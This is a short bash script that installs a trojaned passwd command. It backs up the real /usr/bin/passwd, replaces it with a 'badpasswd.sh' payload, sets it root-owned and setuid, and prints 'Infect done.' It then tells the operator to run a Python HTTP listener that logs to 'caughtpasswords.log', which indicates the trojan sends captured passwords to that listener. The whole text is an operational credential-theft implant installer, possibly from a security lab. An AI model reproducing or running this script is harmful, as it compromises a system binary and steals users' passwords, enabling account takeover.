#!/bin/bash

sudo cp /usr/bin/passwd /usr/bin/newpasswd
echo "real passwd command backed up to /usr/bin/newpasswd"

sudo cp badpasswd.sh /usr/bin/passwd
sudo chown root:root /usr/bin/passwd
sudo chmod u+s /usr/bin/passwd

echo "Infect done."
echo "Test with command:"
echo "passwd [user optional]"
echo ""
echo "Listener should run:"
echo "python3 -m http.server [insert listening port here] > caughtpasswords.log"
